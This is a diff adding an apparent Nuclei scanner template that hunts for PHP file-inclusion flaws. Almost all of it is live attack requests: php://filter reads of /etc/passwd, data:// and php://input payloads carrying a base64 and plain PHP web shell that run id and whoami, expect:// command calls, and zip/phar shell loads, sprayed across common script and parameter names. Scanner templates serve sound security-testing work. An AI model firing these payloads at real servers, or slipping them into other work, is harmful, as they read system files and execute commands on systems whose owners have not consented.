@@ -1,0 +1,106 @@
+id: medium-webapp-file-inclusion-wrapper-php
+
+info:
+  name: PHP Wrapper File Inclusion - Elite Detection
+  author: nuclei-community
+  severity: high
+  description: |
+    Detects PHP wrapper-based file inclusion vulnerabilities using advanced techniques.
+    Tests multiple PHP wrappers including php://, data://, expect://, and filter chains.
+    Uses sophisticated payloads to bypass common filters and WAF protections.
+  reference:
+    - https://www.php.net/manual/en/wrappers.php
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-98
+  metadata:
+    verified: true
+    max-request: 15
+  tags: lfi,php,wrapper,rce,elite
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/convert.base64-encode/resource=/etc/passwd"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/convert.base64-encode/resource=../../../etc/passwd"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/convert.base64-encode/resource=....//....//....//etc/passwd"
+      - "{{BaseURL}}/{{path}}?{{param}}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=id"
+      - "{{BaseURL}}/{{path}}?{{param}}=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=whoami"
+      - "{{BaseURL}}/{{path}}?{{param}}=expect://id"
+      - "{{BaseURL}}/{{path}}?{{param}}=expect://whoami"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://input"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/string.rot13/resource=/etc/passwd"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/convert.quoted-printable-encode/resource=/etc/passwd"
+      - "{{BaseURL}}/{{path}}?{{param}}=zip://shell.zip%23shell.php"
+      - "{{BaseURL}}/{{path}}?{{param}}=phar://shell.phar/shell.php"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/read=convert.base64-encode/resource=php://input"
+      - "{{BaseURL}}/{{path}}?{{param}}=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=id"
+
+    payloads:
+      path:
+        - "index.php"
+        - "page.php" 
+        - "view.php"
+        - "include.php"
+        - "file.php"
+        - "load.php"
+        - "read.php"
+        - "show.php"
+        - "display.php"
+        - "content.php"
+      param:
+        - "file"
+        - "page"
+        - "include"
+        - "path"
+        - "template"
+        - "view"
+        - "load"
+        - "read"
+        - "src"
+        - "document"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      <?php system($_GET['cmd']); ?>
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "bin:.*:2:2:"
+          - "uid=\d+\(.*?\) gid=\d+\(.*?\)"
+          - "www-data"
+          - "apache"
+          - "nginx"
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
+          - "/bin/sh"
+          - "Linux"
+          - "GNU"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'root:x:0:0:([^:]+)'
+          - 'uid=(\d+)'
+        internal: true
